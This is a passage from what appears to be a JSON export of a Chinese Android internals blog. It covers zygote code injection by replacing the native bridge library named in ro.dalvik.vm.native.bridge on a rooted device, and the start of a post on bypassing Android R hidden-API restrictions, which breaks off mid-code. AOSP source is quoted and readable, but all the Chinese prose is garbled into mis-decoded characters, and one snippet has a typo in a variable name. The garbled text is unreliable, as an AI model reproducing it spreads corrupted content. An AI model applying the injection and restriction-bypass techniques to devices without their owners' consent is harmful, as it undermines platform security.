‡åº“çš„.init_arrayä¸­çš„æ‰€æœ‰å‡½æ•°ï¼Œè€Œè®©è‡ªå·±çš„å‡½æ•°è¿›å…¥.init_arrayå®é™…ä¸Šåªéœ€è¦å£°æ˜__attribute__((constructor))å°±å¥½äº†ï¼Œå®Œå…¨æ²¡æœ‰éš¾åº¦å•Šï¼heyï¼Œå…ˆå†·é™ä¸€ä¸‹ï¼Œæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ä¸çŸ¥é“ç­”æ¡ˆï¼šè¿™ä¸ªnative bridgeæ˜¯ä»å“ªä¼ è¿›æ¥çš„ï¼Ÿç­”æ¡ˆå¾ˆç®€å•ï¼Œå›è¿‡å¤´çœ‹ä¸€ä¸‹AndroidRuntime::startVm()å°±æ˜ç™½äº†ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/* * Start the Dalvik Virtual Machine. * * Various arguments, most determined by system properties, are passed in. * The \"mOptions\" vector is updated. * * CAUTION: when adding options in here, be careful not to put the * char buffer inside a nested scope. Adding the buffer to the * options using mOptions.add() does not copy the buffer, so if the * buffer goes out of scope the option may be overwritten. It's best * to put the buffer at the top of the function so that it is more * unlikely that someone will surround it in a scope at a later time * and thus introduce a bug. * * Returns 0 on success. */int AndroidRuntime::startVm(JavaVM** pJavaVM, JNIEnv** pEnv, bool zygote, bool primary_zygote)&#123; JavaVMInitArgs initArgs; // ... // Native bridge library. \"0\" means that native bridge is disabled. // // Note: bridging is only enabled for the zygote. Other runs of // app_process may not have the permissions to mount etc. property_get(\"ro.dalvik.vm.native.bridge\", propBuf, \"\"); if (propBuf[0] == '\\0') &#123; ALOGW(\"ro.dalvik.vm.native.bridge is not expected to be empty\"); &#125; else if (zygote &amp;&amp; strcmp(propBuf, \"0\") != 0) &#123; snprintf(nativeBridgeLibrary, sizeof(\"-XX:NativeBridge=\") + PROPERTY_VALUE_MAX, \"-XX:NativeBridge=%s\", propBuf); addOption(nativeBridgeLibrary); &#125; // ... initArgs.version = JNI_VERSION_1_4; initArgs.options = mOptions.editArray(); initArgs.nOptions = mOptions.size(); initArgs.ignoreUnrecognized = JNI_FALSE; /* * Initialize the VM. * * The JavaVM* is essentially per-process, and the JNIEnv* is per-thread. * If this call succeeds, the VM is ready, and we can start issuing * JNI calls. */ if (JNI_CreateJavaVM(pJavaVM, pEnv, &amp;initArgs) &lt; 0) &#123; ALOGE(\"JNI_CreateJavaVM failed\\n\"); return -1; &#125; return 0;&#125;åŸæ¥æ˜¯è¯»å–çš„ro.dalvik.vm.native.bridgeè¿™ä¸ªç³»ç»Ÿå±æ€§å•Šï¼Œç­‰ç­‰ï¼Œè¿™ä¸ªå±æ€§åå­—æ˜¯ä»¥.roå¼€å¤´çš„ï¼Œä¹Ÿå°±ä»£è¡¨ç€è¿™ä¸ªå±æ€§æ˜¯åªè¯»çš„ï¼Œä¸€æ—¦è®¾ç½®ä¸èƒ½ä¿®æ”¹â€¦â€¦ å¦ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œè¿™ä¸ªå±æ€§å®šä¹‰åœ¨default.propä¸­ï¼Œè€Œéå¸¸è§„çš„build.propï¼Œè¿™ä¸ªæ–‡ä»¶æ”¹ä¸äº†ï¼Œæ¯æ¬¡å¼€æœºéƒ½ä¼šé‡æ–°è¯»å–ï¼Œé‚£è¿˜ç©å•¥å•Šï¼Œæ‹œæ‹œâ€¦â€¦ç­‰ç­‰ï¼è°è¯´è¿™æ¡å±æ€§å°±åªèƒ½ç”±å‚å•†ä¿®æ”¹äº†ï¼Ÿåˆ©ç”¨æˆ‘æ‹¿æ¥æµ‹è¯•çš„è®¾å¤‡æ˜¯ä¸€å°Google Pixel 3ï¼ˆAndroid 10ï¼ŒMagisk 20.4ï¼‰ï¼Œå› ä¸ºæœ‰magiskæ‰€ä»¥ç›´æ¥å†™æˆäº†magiskæ¨¡å—ï¼›æ²¡æœ‰magiskçš„è¯å¯ä»¥è€ƒè™‘ä¿®æ”¹ramdisk.imgï¼ˆæ­¤æ–¹æ³•åŒæ ·é€‚ç”¨äºæ¨¡æ‹Ÿå™¨ï¼‰ï¼Œå°†default.propä¸­çš„ro.dalvik.vm.native.bridgeä¿®æ”¹ä¸ºæˆ‘ä»¬çš„soæ–‡ä»¶åå°±å¥½äº†ï¼ˆæ³¨æ„æ–‡ä»¶å¿…é¡»åœ¨ç³»ç»Ÿçš„libä¸‹é¢ï¼‰è¿™é‡Œå°±å½“ä½ æŠŠç¯å¢ƒé…ç½®å¥½äº†å§ï¼Œè®©æˆ‘ä»¬ç»§ç»­ï¼šå†™ä¸€ä¸ªå‡½æ•°ï¼Œå¾€é‡Œé¢å†™å…¥ä»£ç ï¼ŒåŠ ä¸Š__attribute__((constructor))ï¼Œç¼–è¯‘ï¼Œæ”¾/system/lib64å’Œ/system/libä¸‹é¢ï¼Œä¿®æ”¹ro.dalvik.vm.native.bridgeä¸ºæˆ‘ä»¬çš„æ–‡ä»¶åï¼Œé‡å¯ï¼ŒæˆåŠŸï¼Œå®Œç»“æ’’èŠ±â€¦â€¦å½“ç„¶ä¸å¯èƒ½è¿™ä¹ˆå®¹æ˜“ï¼Œæ­¤æ—¶è™½ç„¶ä½ å·²ç»æŠŠä»£ç æˆåŠŸæ³¨å…¥åˆ°äº†zygoteè¿›ç¨‹ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€äº›é—®é¢˜è¦å¤„ç†ï¼Œè®©æˆ‘ä»¬æ¥ç»†æ•°ä¸€ä¸‹ã€‚ç³»ç»ŸåŸæœ‰çš„native bridgeè¢«è¦†ç›–native bridgeè¿™ä¸œè¥¿å¯¹armè®¾å¤‡ä¸Šæ¥è¯´åŸºæœ¬æ²¡å•¥ç”¨ï¼Œç„¶è€Œå¯¹x86è®¾å¤‡æ¥è¯´ï¼Œæ²¡æœ‰è¿™ç©æ„ä½ å°±æ²¡æ³•ç”¨åªæ”¯æŒarmçš„appï¼Œä¹Ÿå°±æ˜¯è¯´ä½ è¿å¾®ä¿¡éƒ½ç”¨ä¸äº†â€¦â€¦è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¿˜æ˜¯å¾—çœ‹æºç ï¼Œçœ‹çœ‹ç³»ç»Ÿæ˜¯æ€ä¹ˆè°ƒç”¨çš„native bridgeé‡Œçš„å‡½æ•°ï¼š1234567void* NativeBridgeGetTrampoline(void* handle, const char* name, const char* shorty, uint32_t len) &#123; if (NativeBridgeInitialized()) &#123; return callbacks-&gt;getTrampoline(handle, name, shorty, len); &#125; return nullptr;&#125;æ˜¯ç”¨çš„ä¸€ä¸ªå«callbacksçš„å…¨å±€å˜é‡å•Šï¼Œçœ‹ä¸‹è¿™ä¸ªcallbacksæ˜¯å•¥ï¼š1234567891011121314151617// Native bridge interfaces to runtime.struct NativeBridgeCallbacks &#123; // Version number of the interface. uint32_t version; bool (*initialize)(const struct NativeBridgeRuntimeCallbacks* runtime_cbs, const char* private_dir, const char* instruction_set); void* (*loadLibrary)(const char* libpath, int flag); void* (*getTrampoline)(void* handle, const char* name, const char* shorty, uint32_t len); // ...&#125;// Pointer to the callbacks. Available as soon as LoadNativeBridge succeeds, but only initialized// later.static const NativeBridgeCallbacks* callbacks = nullptr;åŸæ¥æ˜¯ä¸€ä¸ªæŒ‡å‘NativeBridgeCallbacksçš„æŒ‡é’ˆï¼Œè¿™ä¸ªå«åšNativeBridgeCallbacksçš„ç»“æ„ä½“é‡ŒåŒ…å«å‡½æ•°æŒ‡é’ˆï¼Œè¿è¡Œæ—¶ä¼šæ‰¾åˆ°å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆç„¶åè°ƒç”¨ã€‚è¿™ä¸ªå˜é‡æ˜¯åœ¨å“ªåˆå§‹åŒ–çš„å‘¢ï¼š1234567891011121314151617181920212223242526// The symbol name exposed by native-bridge with the type of NativeBridgeCallbacks.static constexpr const char* kNativeBridgeInterfaceSymbol = \"NativeBridgeItf\";bool LoadNativeBridge(const char* nb_library_filename, const NativeBridgeRuntimeCallbacks* runtime_cbs) &#123; // Try to open the library. void* handle = dlopen(nb_library_filename, RTLD_LAZY); if (handle != nullptr) &#123; callbacks = reinterpret_cast&lt;NativeBridgeCallbacks*&gt;(dlsym(handle, kNativeBridgeInterfaceSymbol)); if (callbacks != nullptr) &#123; if (isCompatibleWith(NAMESPACE_VERSION)) &#123; // Store the handle for later. native_bridge_handle = handle; &#125; else &#123; callbacks = nullptr; dlclose(handle); ALOGW(\"Unsupported native bridge interface.\"); &#125; &#125; else &#123; dlclose(handle); &#125; &#125; return state == NativeBridgeState::kOpened; &#125;&#125;æ˜¯ä»native bridgeçš„soåº“ä¸­æ‰¾åˆ°çš„ï¼Œå¯¹åº”ç¬¦å·æ˜¯NativeBridgeItfã€‚æ—¢ç„¶ç³»ç»Ÿæ˜¯è¿™æ ·åšçš„ï¼Œé‚£æˆ‘ä»¬å°±é¡ºç€ç³»ç»Ÿæ¥ï¼Œåœ¨åˆé€‚çš„æ—¶å€™å·æ¢æ¢æŸ±ä¸€ä¸‹ã€‚é¦–å…ˆå£°æ˜ä¸€ä¸ªå¯¹åº”ç±»å‹çš„å˜é‡NativeBridgeItfï¼š1__attribute__ ((visibility (\"default\"))) NativeBridgeCallbacks NativeBridgeItf;æ³¨ï¼šå¦‚æœä½ ä½¿ç”¨c++ï¼Œè®°å¾—åŠ ä¸Šextern &quot;C&quot;ã€‚ç„¶åï¼Œåœ¨ç³»ç»Ÿdlopenæˆ‘ä»¬çš„åº“æ—¶ï¼Œä¼šæ‰§è¡Œ.init_arrayé‡Œçš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡ŒåŠ¨æ‰‹è„šï¼š1234567891011121314151617181920if (real_nb_filename[0] == '\\0') &#123; LOGW(\"ro.dalvik.vm.native.bridge is not expected to be empty\");&#125; else if (strcmp(real_nb_filename, \"0\") != 0) &#123; LOGI(\"The system has real native bridge support, libname %s\", real_nb_filename); const char* error_msg; void* handle = dlopen(real_nb_filename, RTLD_LAZY); if (handle) &#123; void* real_nb_itf = dlsym(handle, \"NativeBridgeItf\"); if (real_nb_itf) &#123; // sizeof(NativeBridgeCallbacks) maybe changed in other android version memcpy(&amp;NativeBridgeItf, real_nb_itf, sizeof(NativeBridgeCallbacks)); return; &#125; errro_msg = dlerror(); dlclose(handle); &#125; else &#123; errro_msg = dlerror(); &#125; LOGE(\"Could not setup NativeBridgeItf for real lib %s: %s\", real_nb_filename, error_msg);&#125;ç®€å•è§£é‡Šä¸€ä¸‹ï¼šç³»ç»Ÿæ˜¯é€šè¿‡è¯»å–æˆ‘ä»¬çš„NativeBridgeItfè¿™ä¸ªå˜é‡æ¥è·å–è¦æ‰§è¡Œçš„å¯¹åº”å‡½æ•°çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ä»¿ç…§ç³»ç»Ÿï¼Œä»çœŸæ­£çš„native bridgeä¸­è¯»å–è¿™ä¸ªå˜é‡ï¼Œè¦†ç›–æ‰æˆ‘ä»¬æš´éœ²å‡ºå»çš„é‚£ä¸ªNativeBridgeItfï¼Œè¿™æ ·å°±ä¼šèµ°çœŸå®çš„native bridge callbacksã€‚æ³¨ï¼šè¿™é‡Œè¿˜æœ‰ä¸ªå‘ï¼ŒNativeBridgeCallbacksè¿™ä¸ªç»“æ„ä½“çš„å¤§å°åœ¨å…¶ä»–ç³»ç»Ÿç‰ˆæœ¬æ˜¯ä¸åŒçš„ï¼Œå¦‚æœåªå¤åˆ¶å›ºå®šå¤§å°ï¼Œè¦ä¹ˆå¤åˆ¶ä¸å…¨è¦ä¹ˆè¶Šç•Œï¼›æ‰€ä»¥è¿™é‡Œéœ€è¦æŒ‰ç…§ç‰ˆæœ¬åˆ¤æ–­ä¸€ä¸‹ã€‚æ— æ³•é©»ç•™åœ¨å†…å­˜ä¸­å½“ä½ å…´è‡´å‹ƒå‹ƒåœ°å†™å¥½äº†ä»£ç ï¼Œè¿è¡Œæ—¶ä½ ä¼šå‘ç°å„ç§å¥‡æ€ªçš„bugï¼Œæ’æŸ¥Néåä½ æ‰å‘ç°ï¼Œä½ å†™å¥½çš„è¿™ä¸ªsoåœ¨å†…å­˜ä¸­ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™æ¶ˆå¤±äº†ï¼Ÿï¼Ÿè®©æˆ‘ä»¬çœ‹çœ‹ç³»ç»Ÿçš„é‚£ä¸ªLoadNativeBridgeï¼š12345678910111213141516void* handle = dlopen(nb_library_filename, RTLD_LAZY);if (handle != nullptr) &#123; callbacks = reinterpret_cast&lt;NativeBridgeCallbacks*&gt;(dlsym(handle, kNativeBridgeInterfaceSymbol)); if (callbacks != nullptr) &#123; if (isCompatibleWith(NAMESPACE_VERSION)) &#123; // Store the handle for later. native_bridge_handle = handle; &#125; else &#123; callbacks = nullptr; dlclose(handle); ALOGW(\"Unsupported native bridge interface.\"); &#125; &#125; else &#123; dlclose(handle); &#125;&#125;å¦‚æœisCompatibleWithè¿™ä¸ªå‡½æ•°è¿”å›falseï¼Œé‚£ä¹ˆå°±ä¼šcloseæ‰æˆ‘ä»¬çš„soåº“ã€‚12345678910111213141516// The policy of invoking Nativebridge changed in v3 with/without namespace.// Suggest Nativebridge implementation not maintain backward-compatible.static bool isCompatibleWith(const uint32_t version) &#123; // Libnativebridge is now designed to be forward-compatible. So only \"0\" is an unsupported // version. if (callbacks == nullptr || callbacks-&gt;version == 0 || version == 0) &#123; return false; &#125; // If this is a v2+ bridge, it may not be forwards- or backwards-compatible. Check. if (callbacks-&gt;version &gt;= SIGNAL_VERSION) &#123; return callbacks-&gt;isCompatibleWith(version); &#125; return true;&#125;æ˜¯é€šè¿‡callbacks-&gt;versionå’Œcallbacks-&gt;isCompatibleWithè¿™ä¸ªå‡½æ•°æŒ‡é’ˆåˆ¤æ–­çš„ã€‚é‚£æˆ‘ä»¬éœ€è¦åœ¨ç³»ç»Ÿæ²¡æœ‰native bridgeæ—¶è®¾ç½®ä¸€ä¸‹è¿™äº›ä¸œè¥¿ã€‚ï¼ˆå¦‚æœç³»ç»Ÿæœ‰native bridgeé‚£ä¹ˆåœ¨ä¸Šé¢NativeBridgeItfå°±å·²ç»è¢«è¦†ç›–äº†ï¼‰ä½ éœ€è¦æŠŠcallbacksé‡Œé¢çš„ä¸œè¥¿éƒ½è®¾ç½®ä¸€ä¸‹ï¼Œä»¥å…å‘ç”Ÿå…¶ä»–é—®é¢˜ï¼›è¿˜å¥½è¿˜å¥½ï¼Œé‚£äº›å‡½æ•°åªéœ€è¦å†™ä¸ªç©ºå®ç°å°±è¡Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç‰ˆæœ¬ï¼Œæ¯”å¦‚5.0å°±åªæ¥å—v1ç‰ˆæœ¬çš„native bridgeï¼Œè€Œ7.0æ—¶åªæ¥å—v3åŠä»¥ä¸Šç‰ˆæœ¬ã€‚æŠŠè¿™äº›è®¾ç½®å¥½äº†ä»¥åï¼Œä½ çš„soåº“èƒ½æˆåŠŸé©»ç•™åœ¨zygoteè¿›ç¨‹çš„å†…å­˜ä¸­äº†ï¼›ç„¶è€Œï¼Œä½ åœ¨åº”ç”¨è¿›ç¨‹ä¸­æ‰¾ä¸åˆ°è¿™ä¸ªsoåº“ï¼Œè¿™æ˜¯å› ä¸ºæ–°è¿›ç¨‹forkå‡ºæ¥ä»¥åï¼Œå¦‚æœä¸éœ€è¦native bridgeï¼Œç³»ç»Ÿä¼šå¸è½½å®ƒï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950static void ZygoteHooks_nativePostForkChild(JNIEnv* env, jclass, jlong token, jint runtime_flags, jboolean is_system_server, jboolean is_zygote, jstring instruction_set) &#123; // ... if (instruction_set != nullptr &amp;&amp; !is_system_server) &#123; ScopedUtfChars isa_string(env, instruction_set); InstructionSet isa = GetInstructionSetFromString(isa_string.c_str()); Runtime::NativeBridgeAction action = Runtime::NativeBridgeAction::kUnload; if (isa != InstructionSet::kNone &amp;&amp; isa != kRuntimeISA) &#123; action = Runtime::NativeBridgeAction::kInitialize; &#125; runtime-&gt;InitNonZygoteOrPostFork(env, is_system_server, is_zygote, action, isa_string.c_str()); &#125; else &#123; runtime-&gt;InitNonZygoteOrPostFork( env, is_system_server, is_zygote, Runtime::NativeBridgeAction::kUnload, /*isa=*/ nullptr, profile_system_server); &#125;&#125;void Runtime::InitNonZygoteOrPostFork( JNIEnv* env, bool is_system_server, // This is true when we are initializing a child-zygote. It requires // native bridge initialization to be able to run guest native code in // doPreload(). bool is_child_zygote, NativeBridgeAction action, const char* isa, bool profile_system_server) &#123; if (is_native_bridge_loaded_) &#123; switch (action) &#123; case NativeBridgeAction::kUnload: UnloadNativeBridge(); is_native_bridge_loaded_ = false; break; case NativeBridgeAction::kInitialize: InitializeNativeBridge(env, isa); break; &#125; &#125; // ...&#125;è¿™ä¸ªè¿‡ç¨‹æˆ‘ä»¬å¾ˆéš¾å¹²é¢„ï¼Œç„¶è€Œå…¶å®æˆ‘ä»¬å¯ä»¥æ¢ä¸ªæ€è·¯ï¼šæ—¢ç„¶ç³»ç»Ÿè¦å¸è½½è¿™ä¸ªsoåº“ï¼Œé‚£æˆ‘ä»¬å°±è®©å®ƒå¸è½½ï¼›æˆ‘ä»¬å·²ç»å¯ä»¥åœ¨zygoteé‡Œæ‰§è¡Œä»»æ„ä»£ç äº†ï¼Œé‚£ä¹ˆå†™ä¸ªæ–°soåº“æŠŠä¸»è¦é€»è¾‘æ”¾é‡Œé¢ï¼Œåœ¨è¿™ä¸ªå‡çš„native bridgeé‡Œdlopen()è¿™ä¸ªæ–°åº“ï¼Œå‡çš„native bridgeç›´æ¥å½“ä¸ªloaderä¸å°±å¥½äº†å˜›ï¼è€Œä¸”è¿™æ ·çš„è¯å®é™…ä¸Šæˆ‘ä»¬ä¸ç”¨å®ç°é‚£å †å‡½æ•°ï¼Œåªéœ€è¦æŠŠversionè®¾ç½®æˆä¸€ä¸ªæ— æ•ˆçš„å€¼ï¼ˆæ¯”å¦‚0ï¼‰ï¼Œè¿™æ ·ç³»ç»Ÿæ£€æµ‹åˆ°ç‰ˆæœ¬æ— æ•ˆå°±ä¼šè‡ªåŠ¨å…³é—­æˆ‘ä»¬çš„å‡native bridgeåº“ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒé‚£äº›å›è°ƒå‡½æ•°ä¼šè¢«è°ƒç”¨~æ€»ç»“åˆ©ç”¨native bridgeå¯ä»¥å®ç°æ¯”è¾ƒç®€å•çš„zygoteæ³¨å…¥ï¼Œå®é™…ç”¨èµ·æ¥éœ€è¦è´¹ç‚¹åŠŸå¤«ï¼Œä¸è¿‡éƒ½æ˜¯ä½“åŠ›æ´»ï¼Œæ¯”å¦‚æ¯ä¸ªç‰ˆæœ¬ä¸­NativeBridgeCallbacksè¿™ä¸ªç»“æ„ä½“çš„å¤§å°ä¹‹ç±»çš„ï¼›ä»¥åå¯èƒ½ä¼šæŠŠè¿™ä¸œè¥¿åº”ç”¨åœ¨æˆ‘çš„Dreamlandä¸Šã€‚æ–‡æœ«å†æ”¾ä¸€ä¸‹ç¤ºä¾‹ä»£ç é“¾æ¥ï¼šNbInjectionQQç¾¤ï¼š949888394ï¼Œæ¬¢è¿ä¸€èµ·æ¥ç©~æ–‡ç« å¯èƒ½æœ‰ç–æ¼ï¼Œä¹Ÿå¯èƒ½æœ‰æ›´å¥½çš„åŠæ³•ï¼›æ¬¢è¿äº¤æµè®¨è®º~","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"æ³¨å…¥","slug":"æ³¨å…¥","permalink":"https://blog.canyie.top/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"Android Rä¸Šçš„éšè—APIé™åˆ¶å­¦ä¹ ç¬”è®°","slug":"hiddenapi-restriction-policy-on-android-r","date":"2020-06-10T02:00:00.000Z","updated":"2025-04-24T10:33:02.823Z","comments":true,"path":"2020/06/10/hiddenapi-restriction-policy-on-android-r/","link":"","permalink":"https://blog.canyie.top/2020/06/10/hiddenapi-restriction-policy-on-android-r/","excerpt":"2018å¹´å‘å¸ƒçš„Android 9ä¸­å¼•å…¥äº†å¯¹éšè—APIçš„é™åˆ¶ï¼Œè¿™å¯¹æ•´ä¸ªAndroidç”Ÿæ€æ¥è¯´å½“ç„¶æ˜¯ä¸€ä»¶å¥½äº‹ï¼Œä½†ä¹Ÿä¸¥é‡é™åˆ¶äº†ä»¥å¾€æˆ‘ä»¬é€šè¿‡åå°„ç­‰æ‰‹æ®µå®ç°çš„â€œé»‘ç§‘æŠ€â€ï¼ˆå¦‚æ’ä»¶åŒ–ç­‰ï¼‰ï¼Œæ‰€ä»¥å¼€å‘è€…ä»¬çº·çº·å¯»æ‰¾æ‰‹æ®µç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ¯”å¦‚æˆ‘æ›¾ç»æå‡ºäº†ä¸¤ä¸ªç»•è¿‡æ–¹æ³•ï¼Œå…¶ä¸­ä¸€ä¸ªä¾¿æ˜¯å‡ ä¹å®Œç¾çš„åŒé‡åå°„ï¼ˆå³â€œå…ƒåå°„â€ï¼Œç°åœ¨æ¥çœ‹å«â€œå¥—å¨ƒåå°„â€æ¯”è¾ƒå¥½ï¼‰ï¼›è€Œåœ¨å³å°†å‘å¸ƒçš„Android Rä¸­æŠŠè¿™ä¸ªæ–¹æ³•å°æ€äº†ï¼ˆè°·æ­Œï¼šç¦æ­¢å¥—å¨ƒï¼ï¼‰ï¼Œå› æ­¤æˆ‘é‡æ–°ç ”ç©¶äº†Android Rä¸­çš„é™åˆ¶ç­–ç•¥ã€‚","text":"2018å¹´å‘å¸ƒçš„Android 9ä¸­å¼•å…¥äº†å¯¹éšè—APIçš„é™åˆ¶ï¼Œè¿™å¯¹æ•´ä¸ªAndroidç”Ÿæ€æ¥è¯´å½“ç„¶æ˜¯ä¸€ä»¶å¥½äº‹ï¼Œä½†ä¹Ÿä¸¥é‡é™åˆ¶äº†ä»¥å¾€æˆ‘ä»¬é€šè¿‡åå°„ç­‰æ‰‹æ®µå®ç°çš„â€œé»‘ç§‘æŠ€â€ï¼ˆå¦‚æ’ä»¶åŒ–ç­‰ï¼‰ï¼Œæ‰€ä»¥å¼€å‘è€…ä»¬çº·çº·å¯»æ‰¾æ‰‹æ®µç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ¯”å¦‚æˆ‘æ›¾ç»æå‡ºäº†ä¸¤ä¸ªç»•è¿‡æ–¹æ³•ï¼Œå…¶ä¸­ä¸€ä¸ªä¾¿æ˜¯å‡ ä¹å®Œç¾çš„åŒé‡åå°„ï¼ˆå³â€œå…ƒåå°„â€ï¼Œç°åœ¨æ¥çœ‹å«â€œå¥—å¨ƒåå°„â€æ¯”è¾ƒå¥½ï¼‰ï¼›è€Œåœ¨å³å°†å‘å¸ƒçš„Android Rä¸­æŠŠè¿™ä¸ªæ–¹æ³•å°æ€äº†ï¼ˆè°·æ­Œï¼šç¦æ­¢å¥—å¨ƒï¼ï¼‰ï¼Œå› æ­¤æˆ‘é‡æ–°ç ”ç©¶äº†Android Rä¸­çš„é™åˆ¶ç­–ç•¥ã€‚2021/4/10 æ›´æ–°ï¼šæœ¬æ–‡å­˜åœ¨çº°æ¼ï¼Œè¯·çœ‹ä¸€ä¸ªé€šç”¨çš„çº¯ Java å®‰å“éšè— API é™åˆ¶ç»•è¿‡æ–¹æ¡ˆä¸Šæœ‰æ”¿ç­–å¸¸è¨€é“ï¼ŒçŸ¥å·±çŸ¥å½¼ï¼Œç™¾æˆ˜ç™¾èƒœã€‚è¦æƒ³ç ´è§£è¿™ä¸ªé™åˆ¶ï¼Œå°±å¿…é¡»å»ææ‡‚ç³»ç»Ÿæ˜¯æ€ä¹ˆæ–½åŠ çš„é™åˆ¶ï¼›okï¼ŒåºŸè¯ä¸å¤šè¯´ï¼Œletâ€™s goï¼ä»¥æˆ‘ä»¬åœ¨Javaå±‚é€šè¿‡åå°„è·å–ä¸€ä¸ªMethodä¸ºä¾‹ï¼ŒClass.getMethod/getDeclaredMethodæœ€ç»ˆéƒ½ä¼šè¿›å…¥ä¸€ä¸ªnativeæ–¹æ³•getDeclaredMethodInternalï¼Œè¿™ä¸ªæ–¹æ³•çš„å®ç°å¦‚ä¸‹ï¼š1234567891011121314static jobject Class_getDeclaredMethodInternal(JNIEnv* env, jobject javaThis, jstring name, jobjectArray args) &#123; // çœç•¥æ— å…³ä»£ç â€¦â€¦ Handle&lt;mirror::Method&gt; result = hs.NewHandle( mirror::Class::GetDeclaredMethodInternal&lt;kRuntimePointerSize&gt;( soa.Self(), klass, soa.Decode&lt;mirror::String&gt;(name), soa.Decode&lt;mirror::ObjectArray&lt;mirror::Class&gt;&gt;(args), GetHiddenapiAccessContextFunction(soa.Self()))); if (result == nullptr || ShouldDenyAccessToMember(result-&gt;GetArtMethod(), soa.Self())) &#123; return nullptr; &#125; return soa.AddLocalReference&lt;jobject&gt;(result.Get());&#125;æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå¦‚æœShouldDenyAccessToMemberè¿”å›trueï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›nullï¼Œä¸Šå±‚å°±ä¼šæŠ›å‡ºæ–¹æ³•æ‰¾ä¸åˆ°çš„å¼‚å¸¸ã€‚è¿™é‡Œå’ŒAndroid Pæ²¡ä»€ä¹ˆä¸åŒï¼Œåªæ˜¯æŠŠShouldBlockAccessToMemberæ”¹äº†ä¸ªåè€Œå·²ã€‚ShouldDenyAccessToMemberä¼šè°ƒç”¨åˆ°hiddenapi::ShouldDenyAccessToMemberï¼Œè¯¥å‡½æ•°æ˜¯è¿™æ ·å®ç°çš„ï¼š123456789101112131415161718192021222324252627282930313233343536373839template&lt;typename T&gt;inline bool ShouldDenyAccessToMember(T* member, const std::function&lt;AccessContext()&gt;&amp; fn_get_access_context, AccessMethod access_method) REQUIRES_SHARED(Locks::mutator_lock_) &#123; const uint32_t runtime_flags = GetRuntimeFlags(member); // 1ï¼šå¦‚æœè¯¥æˆå‘˜æ˜¯å…¬å¼€APIï¼Œç›´æ¥é€šè¿‡ if ((runtime_flags &amp; kAccPublicApi) != 0) &#123; return false; &#125; // 2ï¼šä¸æ˜¯å…¬å¼€APIï¼ˆå³ä¸ºéšè—APIï¼‰ï¼Œè·å–è°ƒç”¨è€…å’Œè¢«è®¿é—®æˆå‘˜çš„Domain // å› ä¸ºè·å–è°ƒç”¨è€…éœ€è¦å›æº¯è°ƒç”¨æ ˆï¼Œæ€§èƒ½éå¸¸å·®ï¼Œæ‰€ä»¥å°½é‡é¿å…è¿™ä¸ªæ¶ˆè€— const AccessContext caller_context = fn_get_access_context(); const AccessContext callee_context(member-&gt;GetDeclaringClass()); // 3ï¼šå¦‚æœè°ƒç”¨è€…æ˜¯å¯ä¿¡çš„ï¼Œç›´æ¥è¿”å› if (caller_context.CanAlwaysAccess(callee_context)) &#123; return false; &#125; // 4ï¼šéå¯ä¿¡è°ƒç”¨è€…å°è¯•è®¿é—®éšè—APIï¼Œæ ¹æ®è°ƒç”¨è€…çš„Domainå†³å®šè¡Œä¸º switch (caller_context.GetDomain()) &#123; case Domain::kApplication: &#123; DCHECK(!callee_context.IsApplicationDomain()); // å¦‚æœè®¿é—®æ£€æŸ¥è¢«å®Œå…¨ç¦ç”¨ï¼Œé‚£ä¹ˆç›´æ¥è¿”å› EnforcementPolicy policy = Runtime::Current()-&gt;GetHiddenApiEnforcementPolicy(); if (policy == EnforcementPolicy::kDisabled) &#123; return false; &#125; // 5ï¼šè°ƒç”¨detail::ShouldDenyAccessToMemberImplï¼Œå†³å®šæ˜¯å¦éœ€è¦æ‹’ç»è®¿é—® return detail::ShouldDenyAccessToMemberImpl(member, api_list, access_method); &#125; // çœç•¥ &#125;è¿™ä¸ªå‡½æ•°è¿˜æ˜¯æ¯”è¾ƒé•¿çš„ï¼Œæˆ‘ä»¬ä¸€æ­¥æ­¥åˆ†æã€‚åˆ¤æ–­ç›®æ ‡æˆå‘˜æ˜¯å¦æ˜¯å…¬å¼€APIï¼Œå¦‚æœæ˜¯é‚£ä¹ˆç›´æ¥é€šè¿‡ï¼Œå…·ä½“å¯ä»¥çœ‹è§æ˜¯é€šè¿‡GetRuntimeFlagsè·å–ï¼Œè¿™ä¸ªflagså…¶å®æ˜¯å‚¨å­˜åœ¨è¯¥æˆå‘˜çš„access_flags_ä¸­ï¼ˆå…¶å®è¿™é‡Œä¸å¤ªå®Œå…¨ï¼Œæš‚ä¸”è¿™ä¹ˆè®¤ä¸ºå§ï¼‰è·å–è°ƒç”¨è€…çš„Domainï¼Œåˆ¤æ–­æ˜¯å¦å¯ä¿¡ï¼Œå¦‚æœå¯ä¿¡ç›´æ¥é€šè¿‡ä»¥ä¸Šæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œæ ¹æ®Domainèµ°ä¸åŒçš„å®ç°ï¼Œæˆ‘ä»¬åº”ç”¨çš„ä»£ç å¯¹åº”çš„Domainæ˜¯kApplicationï¼Œä¸»è¦çœ‹ç¬¬ä¸€ä¸ªcaseå°±è¡Œã€‚ç¬¬äºŒæ­¥ä¸­è·å–è°ƒç”¨è€…çš„å‡½æ•°ä¸­æ ¸å¿ƒéƒ¨åˆ†å¦‚ä¸‹ï¼š1234567891011121314151617181920212223242526272829303132333435363738bool VisitFrame() override REQUIRES_SHARED(Locks::mutator_lock_) &#123; ArtMethod *m = GetMethod(); if (m == nullptr) &#123; // Attached native thread. Assume this is *not* boot class path. caller = nullptr; return false; &#125; else if 